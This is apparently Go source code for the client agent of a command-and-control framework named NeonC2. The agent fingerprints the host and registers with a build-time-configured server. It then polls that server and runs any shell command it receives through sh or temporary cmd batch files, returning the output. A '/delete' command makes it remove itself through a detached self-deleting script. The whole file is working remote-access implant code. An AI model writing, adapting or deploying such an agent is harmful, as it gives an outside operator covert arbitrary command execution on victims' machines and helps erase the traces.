package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var (
	// serverURL can be set at build time via -ldflags or command line
	serverURL      string
	defaultServerURL = "http://localhost:8080"
	hostID         string
	hostname       string
	ipAddress      string
	osType         string
	osVersion      string
	arch           string
	hardwareID     string
	syncInterval   time.Duration = 5 * time.Second  // Default, can be updated from server
	currentDir     string        // Current working directory (stateful)
)

// Build-time variables (set via ldflags)
var (
	buildServerURL string
)

type HostRegistration struct {
	Hostname     string `json:"hostname"`
	IPAddress    string `json:"ip_address"`
	OSType       string `json:"os_type"`
	OSVersion    string `json:"os_version"`
	Architecture string `json:"architecture"`
	HardwareID   string `json:"hardware_id"`
}

type HostResponse struct {
	ID               string `json:"id"`
	Hostname          string `json:"hostname"`
	IPAddress        string `json:"ip_address"`
	OSType           string `json:"os_type"`
	OSVersion        string `json:"os_version"`
	IsActive         bool   `json:"is_active"`
	SyncFrequency    int    `json:"sync_frequency"`
	IdleTimeoutCycles int   `json:"idle_timeout_cycles"`
}

type Command struct {
	ID        string `json:"id"`
	HostID    string `json:"host_id"`
	Command   string `json:"command"`
	Status    string `json:"status"`
	CreatedAt string `json:"created_at"`
}

type CommandsResponse struct {
	Commands   []Command            `json:"commands"`
	HostConfig *HostConfig          `json:"host_config,omitempty"`
}

type HostConfig struct {
	SyncFrequency    int `json:"sync_frequency"`
	IdleTimeoutCycles int `json:"idle_timeout_cycles"`
}

type CommandResult struct {
	Status   string `json:"status"`
	Result   string `json:"result,omitempty"`
	Error    string `json:"error,omitempty"`
	ExitCode *int   `json:"exit_code,omitempty"`
}

func init() {
	// Determine default server URL (build-time or constant)
	defaultURL := defaultServerURL
	if buildServerURL != "" {
		defaultURL = buildServerURL
	}
	
	flag.StringVar(&serverURL, "server", defaultURL, "Server URL")
	flag.StringVar(&hostname, "hostname", "", "Hostname (default: system hostname)")
	flag.StringVar(&ipAddress, "ip", "auto", "IP address (default: auto-detect)")
	flag.Parse()
	
	// If server URL wasn't set via flag and we have a build-time URL, use it
	if serverURL == defaultURL && buildServerURL != "" {
		serverURL = buildServerURL
	}
}

func getHardwareID() string {
	// Try to get a unique hardware identifier
	switch osType {
	case "linux":
		// Try to read machine-id (systemd)
		if data, err := os.ReadFile("/etc/machine-id"); err == nil {
			return string(bytes.TrimSpace(data))
		}
		// Fallback: try D-Bus machine-id
		if data, err := os.ReadFile("/var/lib/dbus/machine-id"); err == nil {
			return string(bytes.TrimSpace(data))
		}
	case "windows":
		// Use wmic to get system UUID
		cmd := exec.Command("wmic", "csproduct", "get", "uuid")
		var out bytes.Buffer
		cmd.Stdout = &out
		if err := cmd.Run(); err == nil {
			lines := bytes.Split(out.Bytes(), []byte("\n"))
			for _, line := range lines {
				line = bytes.TrimSpace(line)
				if len(line) > 0 && !bytes.Equal(line, []byte("UUID")) {
					return string(line)
				}
			}
		}
	case "darwin":
		// Use system_profiler to get hardware UUID
		cmd := exec.Command("system_profiler", "SPHardwareDataType")
		var out bytes.Buffer
		cmd.Stdout = &out
		if err := cmd.Run(); err == nil {
			// Parse output for "Hardware UUID"
			lines := bytes.Split(out.Bytes(), []byte("\n"))
			for _, line := range lines {
				if bytes.Contains(line, []byte("Hardware UUID")) {
					parts := bytes.Split(line, []byte(":"))
					if len(parts) == 2 {
						return string(bytes.TrimSpace(parts[1]))
					}
				}
			}
		}
	}
	
	// Fallback: use hostname + MAC address if available
	// This is less reliable but better than nothing
	return hostname + "-" + arch
}

func getSystemInfo() {
	if hostname == "" {
		hn, err := os.Hostname()
		if err != nil {
			hostname = "unknown"
		} else {
			hostname = hn
		}
	}

	osType = runtime.GOOS
	arch = runtime.GOARCH
	
	// Get hardware ID
	hardwareID = getHardwareID()

	// Try to get OS version
	switch osType {
	case "linux":
		if data, err := os.ReadFile("/etc/os-release"); err == nil {
			lines := bytes.Split(data, []byte("\n"))
			for _, line := range lines {
				if bytes.HasPrefix(line, []byte("PRETTY_NAME=")) {
					osVersion = string(bytes.Trim(bytes.TrimPrefix(line, []byte("PRETTY_NAME=")), "\""))
					break
				}
			}
		}
		if osVersion == "" {
			osVersion = "Linux"
		}
	case "windows":
		osVersion = "Windows"
	case "darwin":
		osVersion = "macOS"
	default:
		osVersion = osType
	}
	
	// Initialize current working directory
	if dir, err := os.Getwd(); err == nil {
		currentDir = dir
	} else {
		// Fallback to home directory or root
		if home, err := os.UserHomeDir(); err == nil {
			currentDir = home
		} else {
			if osType == "windows" {
				currentDir = "C:\\"
			} else {
				currentDir = "/"
			}
		}
	}
	log.Printf("Initial working directory: %s", currentDir)
}

func registerHost() error {
	reg := HostRegistration{
		Hostname:     hostname,
		IPAddress:    ipAddress,
		OSType:       osType,
		OSVersion:    osVersion,
		Architecture: arch,
		HardwareID:   hardwareID,
	}

	jsonData, err := json.Marshal(reg)
	if err != nil {
		return fmt.Errorf("failed to marshal registration: %w", err)
	}

	resp, err := http.Post(serverURL+"/api/hosts", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to register host: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("registration failed: %s - %s", resp.Status, string(body))
	}

	var hostResp HostResponse
	if err := json.NewDecoder(resp.Body).Decode(&hostResp); err != nil {
		return fmt.Errorf("failed to decode response: %w", err)
	}

	hostID = hostResp.ID
	
	// Update sync frequency from server if provided
	if hostResp.SyncFrequency > 0 {
		syncInterval = time.Duration(hostResp.SyncFrequency) * time.Second
		log.Printf("Sync frequency set to %d seconds", hostResp.SyncFrequency)
	}
	
	log.Printf("Registered with server. Host ID: %s, Hardware ID: %s", hostID, hardwareID)
	return nil
}

func getCommands() ([]Command, error) {
	resp, err := http.Get(fmt.Sprintf("%s/api/hosts/%s/commands", serverURL, hostID))
	if err != nil {
		return nil, fmt.Errorf("failed to get commands: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		return nil, fmt.Errorf("host not found, re-registering...")
	}

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("failed to get commands: %s - %s", resp.Status, string(body))
	}

	var cmdResp CommandsResponse
	if err := json.NewDecoder(resp.Body).Decode(&cmdResp); err != nil {
		return nil, fmt.Errorf("failed to decode commands: %w", err)
	}

	// Update sync frequency from server if provided
	if cmdResp.HostConfig != nil && cmdResp.HostConfig.SyncFrequency > 0 {
		newInterval := time.Duration(cmdResp.HostConfig.SyncFrequency) * time.Second
		if newInterval != syncInterval {
			syncInterval = newInterval
			log.Printf("Sync frequency updated from server: %d seconds", cmdResp.HostConfig.SyncFrequency)
		}
	}

	return cmdResp.Commands, nil
}

func executeCommand(cmdStr string) (string, string, int) {
	var cmd *exec.Cmd
	var stdout, stderr bytes.Buffer
	
	// Use current working directory for command execution
	// This ensures all commands (ls, cat, type, dir, etc.) execute in the stateful directory
	workingDir := currentDir
	
	// Validate working directory exists (fallback to current if invalid)
	if _, err := os.Stat(workingDir); err != nil {
		log.Printf("Warning: Working directory %s is invalid, using current directory", workingDir)
		if cwd, err := os.Getwd(); err == nil {
			workingDir = cwd
			currentDir = cwd // Update state
		}
	}
	
	switch osType {
	case "windows":
		// On Windows, use a more reliable method to capture output
		// Create a temporary batch file that redirects output to a file
		tmpFile := fmt.Sprintf("%s\\neonc2_output_%d.txt", os.TempDir(), time.Now().UnixNano())
		defer func() {
			// Clean up temp file
			os.Remove(tmpFile)
		}()
		
		// Create batch command that changes to working directory, then executes command
		// Escape the working directory path for use in batch file
		escapedDir := strings.ReplaceAll(workingDir, "%", "%%")
		escapedDir = strings.ReplaceAll(escapedDir, "&", "^&")
		escapedDir = strings.ReplaceAll(escapedDir, "|", "^|")
		
		batchCmd := fmt.Sprintf(`@echo off
chcp 65001 >nul 2>&1
cd /d "%s"
(%s) > "%s" 2>&1
echo EXITCODE=%%ERRORLEVEL%% >> "%s"`, escapedDir, cmdStr, tmpFile, tmpFile)
		
		// Write batch to temp file
		batchFile := tmpFile + ".bat"
		if err := os.WriteFile(batchFile, []byte(batchCmd), 0644); err != nil {
			log.Printf("Failed to create batch file: %v", err)
			// Fallback to direct execution
			wrappedCmd := fmt.Sprintf("chcp 65001 >nul 2>&1 && cd /d \"%s\" && %s", escapedDir, cmdStr)
			cmd = exec.Command("cmd", "/c", wrappedCmd)
			cmd.Dir = workingDir // Set working directory (redundant but safe)
			cmd.Stdout = &stdout
			cmd.Stderr = &stdout
			cmd.Run()
			return stdout.String(), "", 0
		}
		defer os.Remove(batchFile)
		
		// Execute the batch file with working directory set
		cmd = exec.Command("cmd", "/c", batchFile)
		cmd.Dir = workingDir // Set working directory for the command execution
		err := cmd.Run()
		exitCode := 0
		if err != nil {
			if exitError, ok := err.(*exec.ExitError); ok {
				exitCode = exitError.ExitCode()
			} else {
				exitCode = -1
			}
		}
		
		// Read output from temp file
		if data, err := os.ReadFile(tmpFile); err == nil {
			outputStr := string(data)
			// Extract exit code if present
			if strings.Contains(outputStr, "EXITCODE=") {
				lines := strings.Split(outputStr, "\n")
				var outputLines []string
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.HasPrefix(line, "EXITCODE=") {
						if code, err := strconv.Atoi(strings.TrimPrefix(line, "EXITCODE=")); err == nil {
							exitCode = code
						}
					} else if line != "" {
						outputLines = append(outputLines, line)
					}
				}
				outputStr = strings.Join(outputLines, "\n")
			}
			return strings.TrimSpace(outputStr), "", exitCode
		}
		
		// If temp file read failed, return empty with exit code
		return "", "", exitCode
	default:
		cmd = exec.Command("sh", "-c", cmdStr)
		cmd.Dir = workingDir // Set working directory
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr
		
		err := cmd.Run()
		exitCode := 0
		if err != nil {
			if exitError, ok := err.(*exec.ExitError); ok {
				exitCode = exitError.ExitCode()
			} else {
				exitCode = -1
			}
		}
		
		return stdout.String(), stderr.String(), exitCode
	}
}

func updateCommandStatus(commandID, status string) error {
	result := CommandResult{Status: status}
	jsonData, err := json.Marshal(result)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", 
		fmt.Sprintf("%s/api/hosts/%s/commands/%s/status", serverURL, hostID, commandID),
		bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func submitResult(commandID string, result CommandResult) error {
	jsonData, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal result: %w", err)
	}

	req, err := http.NewRequest("POST",
		fmt.Sprintf("%s/api/hosts/%s/commands/%s/result", serverURL, hostID, commandID),
		bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	// Add timeout to prevent hanging
	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to submit result: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to submit result: %s - %s", resp.Status, string(body))
	}

	// Log success for debugging
	log.Printf("Successfully submitted result for command %s (exit code: %d)", commandID[:8], *result.ExitCode)
	return nil
}

func processCommands(commands []Command) {
	for _, cmd := range commands {
		cmdStr := cmd.Command
		log.Printf("Executing command: %s", cmdStr)
		
		// Handle special commands
		if cmdStr == "/deregister" {
			log.Printf("Received deregister command. Deregistering and exiting...")
			
			// Submit result first
			result := CommandResult{
				Status:   "completed",
				Result:   "Client deregistering and exiting",
				ExitCode: intPtr(0),
			}
			submitResult(cmd.ID, result)
			
			// Give a moment for the result to be sent
			time.Sleep(1 * time.Second)
			
			// Call server API to delete this host entry
			req, err := http.NewRequest("DELETE", fmt.Sprintf("%s/api/hosts/%s/deregister", serverURL, hostID), nil)
			if err == nil {
				client := &http.Client{Timeout: 5 * time.Second}
				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
					log.Printf("Host entry deleted from server")
				} else {
					log.Printf("Warning: Failed to delete host entry: %v", err)
				}
			}
			
			// Exit the client
			log.Printf("Exiting client...")
			os.Exit(0)
			return
		}
		
		if cmdStr == "/delete" {
			log.Printf("Received delete command. Deregistering, deleting executable, and exiting...")
			
			// Submit result first
			result := CommandResult{
				Status:   "completed",
				Result:   "Client deregistering, deleting executable, and exiting",
				ExitCode: intPtr(0),
			}
			submitResult(cmd.ID, result)
			
			// Give a moment for the result to be sent
			time.Sleep(1 * time.Second)
			
			// Call server API to delete this host entry
			req, err := http.NewRequest("DELETE", fmt.Sprintf("%s/api/hosts/%s/deregister", serverURL, hostID), nil)
			if err == nil {
				client := &http.Client{Timeout: 5 * time.Second}
				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
					log.Printf("Host entry deleted from server")
				} else {
					log.Printf("Warning: Failed to delete host entry: %v", err)
				}
			}
			
			// Get the executable path
			execPath, err := os.Executable()
			if err != nil {
				log.Printf("Warning: Failed to get executable path: %v", err)
				os.Exit(0)
				return
			}
			
			// Delete the executable (using platform-specific method)
			if err := deleteExecutable(execPath); err != nil {
				log.Printf("Warning: Failed to schedule executable deletion: %v", err)
			} else {
				log.Printf("Executable deletion scheduled: %s", execPath)
			}
			
			// Exit the client
			log.Printf("Exiting client...")
			os.Exit(0)
			return
		}
		
		// Handle cd command (change directory)
		if strings.HasPrefix(cmdStr, "cd ") || cmdStr == "cd" {
			parts := strings.Fields(cmdStr)
			var targetDir string
			
			if len(parts) == 1 {
				// Just "cd" - go to home directory
				if home, err := os.UserHomeDir(); err == nil {
					targetDir = home
				} else {
					result := CommandResult{
						Status:   "failed",
						Error:    "Failed to get home directory",
						ExitCode: intPtr(1),
					}
					submitResult(cmd.ID, result)
					continue
				}
			} else {
				targetDir = strings.TrimSpace(strings.TrimPrefix(cmdStr, "cd "))
				// Handle "cd -" to go to previous directory (we'll track this later if needed)
				// For now, just handle it as a regular path
			}
			
			// Resolve the path relative to current directory
			var absPath string
			if filepath.IsAbs(targetDir) {
				absPath = targetDir
			} else {
				absPath = filepath.Join(currentDir, targetDir)
			}
			
			// Clean the path
			absPath = filepath.Clean(absPath)
			
			// Check if directory exists
			if info, err := os.Stat(absPath); err != nil {
				result := CommandResult{
					Status:   "failed",
					Error:    fmt.Sprintf("cd: %s: %v", targetDir, err),
					ExitCode: intPtr(1),
				}
				submitResult(cmd.ID, result)
				continue
			} else if !info.IsDir() {
				result := CommandResult{
					Status:   "failed",
					Error:    fmt.Sprintf("cd: %s: Not a directory", targetDir),
					ExitCode: intPtr(1),
				}
				submitResult(cmd.ID, result)
				continue
			}
			
			// Change directory
			oldDir := currentDir
			currentDir = absPath
			
			// Verify the change worked
			if actualDir, err := os.Getwd(); err == nil {
				// Try to change to verify it's accessible
				if err := os.Chdir(currentDir); err != nil {
					currentDir = oldDir // Revert on error
					result := CommandResult{
						Status:   "failed",
						Error:    fmt.Sprintf("cd: %s: %v", targetDir, err),
						ExitCode: intPtr(1),
					}
					submitResult(cmd.ID, result)
					continue
				}
				// Restore original directory (we'll use currentDir in executeCommand)
				os.Chdir(actualDir)
			}
			
			result := CommandResult{
				Status:   "completed",
				Result:   fmt.Sprintf("Changed directory to: %s", currentDir),
				ExitCode: intPtr(0),
			}
			submitResult(cmd.ID, result)
			log.Printf("Changed directory from %s to %s", oldDir, currentDir)
			continue
		}
		
		// Handle configuration commands
		if strings.HasPrefix(cmdStr, "/set-sync-frequency") {
			parts := strings.Fields(cmdStr)
			if len(parts) == 2 {
				if seconds, err := strconv.Atoi(parts[1]); err == nil && seconds > 0 && seconds <= 300 {
					oldInterval := syncInterval
					syncInterval = time.Duration(seconds) * time.Second
					result := CommandResult{
						Status:   "completed",
						Result:   fmt.Sprintf("Sync frequency updated from %v to %d seconds", oldInterval, seconds),
						ExitCode: intPtr(0),
					}
					submitResult(cmd.ID, result)
					log.Printf("Sync frequency updated to %d seconds", seconds)
					continue
				}
			}
			result := CommandResult{
				Status:   "failed",
				Error:    "Invalid format. Use: /set-sync-frequency <seconds> (1-300)",
				ExitCode: intPtr(1),
			}
			submitResult(cmd.ID, result)
			continue
		}
		
		if strings.HasPrefix(cmdStr, "/set-idle-timeout") {
			// This is just acknowledged, actual timeout is managed by server
			result := CommandResult{
				Status:   "completed",
				Result:   "Idle timeout configuration updated on server",
				ExitCode: intPtr(0),
			}
			submitResult(cmd.ID, result)
			continue
		}
		
		// Update status to executing
		if err := updateCommandStatus(cmd.ID, "executing"); err != nil {
			log.Printf("Failed to update command status: %v", err)
		}

		// Execute command
		stdout, stderr, exitCode := executeCommand(cmdStr)

		// Prepare result - ensure we have output even if empty
		result := CommandResult{
			Status:   "completed",
			Result:   stdout,
			ExitCode: &exitCode,
		}

		if stderr != "" {
			result.Error = stderr
		}

		if exitCode != 0 {
			result.Status = "failed"
		}

		// Log what we're about to send
		log.Printf("Submitting result for command %s: status=%s, exit_code=%d, stdout_len=%d, stderr_len=%d",
			cmd.ID[:8], result.Status, exitCode, len(stdout), len(stderr))
		
		// Debug: Print output to verify it's being captured (especially for Windows)
		if osType == "windows" {
			outputPreview := stdout
			if len(outputPreview) > 200 {
				outputPreview = outputPreview[:200] + "..."
			}
			log.Printf("Windows command output preview: %q", outputPreview)
			if len(stdout) == 0 && len(stderr) == 0 {
				log.Printf("WARNING: No output captured for Windows command!")
			}
		}

		// Submit result with retry logic
		maxRetries := 3
		for i := 0; i < maxRetries; i++ {
			if err := submitResult(cmd.ID, result); err != nil {
				log.Printf("Failed to submit result (attempt %d/%d): %v", i+1, maxRetries, err)
				if i < maxRetries-1 {
					time.Sleep(2 * time.Second) // Wait before retry
				}
			} else {
				log.Printf("Command completed and result submitted successfully (exit code: %d)", exitCode)
				break
			}
		}
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	
	getSystemInfo()
	log.Printf("Starting NeonC2 Client - OS: %s %s, Arch: %s", osType, osVersion, arch)

	// Register with server
	if err := registerHost(); err != nil {
		log.Fatalf("Failed to register host: %v", err)
	}

	// Main sync loop with dynamic interval
	// Use a ticker that can be reset when sync interval changes
	ticker := time.NewTicker(syncInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			commands, err := getCommands()
			if err != nil {
				log.Printf("Error getting commands: %v", err)
				// Try to re-register if host not found
				if err := registerHost(); err != nil {
					log.Printf("Failed to re-register: %v", err)
				}
				continue
			}

			if len(commands) > 0 {
				processCommands(commands)
			}
			
			// Reset ticker with current sync interval (in case it changed)
			ticker.Reset(syncInterval)
		}
	}
}

func intPtr(i int) *int {
	return &i
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func deleteExecutable(execPath string) error {
	// On Windows, we can't delete a running executable directly.
	// We need to create a script that waits for the process to exit, then deletes the file.
	// On Unix-like systems, we can use a similar approach.
	
	switch osType {
	case "windows":
		// Create a batch script that deletes the executable after a delay
		// The script will run after this process exits
		tmpDir := os.TempDir()
		scriptPath := filepath.Join(tmpDir, fmt.Sprintf("neonc2_delete_%d.bat", time.Now().UnixNano()))
		
		// Create batch script that:
		// 1. Waits a few seconds for the process to fully exit
		// 2. Deletes the executable
		// 3. Deletes itself
		scriptContent := fmt.Sprintf(`@echo off
timeout /t 2 /nobreak >nul 2>&1
:retry
del "%s" >nul 2>&1
if exist "%s" (
    timeout /t 1 /nobreak >nul 2>&1
    goto retry
)
del "%%~f0" >nul 2>&1
`, execPath, execPath)
		
		if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil {
			return fmt.Errorf("failed to create delete script: %w", err)
		}
		
		// Execute the script in the background (detached)
		cmd := exec.Command("cmd", "/c", "start", "/B", scriptPath)
		if err := cmd.Start(); err != nil {
			os.Remove(scriptPath) // Clean up on error
			return fmt.Errorf("failed to start delete script: %w", err)
		}
		cmd.Process.Release() // Detach from parent process
		
		return nil
	default:
		// On Unix-like systems, create a shell script that deletes the executable
		tmpDir := os.TempDir()
		scriptPath := filepath.Join(tmpDir, fmt.Sprintf("neonc2_delete_%d.sh", time.Now().UnixNano()))
		
		// Create shell script that:
		// 1. Waits a few seconds for the process to fully exit
		// 2. Deletes the executable
		// 3. Deletes itself
		scriptContent := fmt.Sprintf(`#!/bin/sh
sleep 2
rm -f "%s" 2>/dev/null
# Retry if file still exists (process might still be running)
while [ -f "%s" ]; do
    sleep 1
    rm -f "%s" 2>/dev/null
done
rm -f "$0" 2>/dev/null
`, execPath, execPath, execPath)
		
		if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
			return fmt.Errorf("failed to create delete script: %w", err)
		}
		
		// Execute the script in the background (detached)
		cmd := exec.Command("sh", "-c", fmt.Sprintf("nohup %s >/dev/null 2>&1 &", scriptPath))
		if err := cmd.Start(); err != nil {
			os.Remove(scriptPath) // Clean up on error
			return fmt.Errorf("failed to start delete script: %w", err)
		}
		cmd.Process.Release() // Detach from parent process
		
		return nil
	}
}
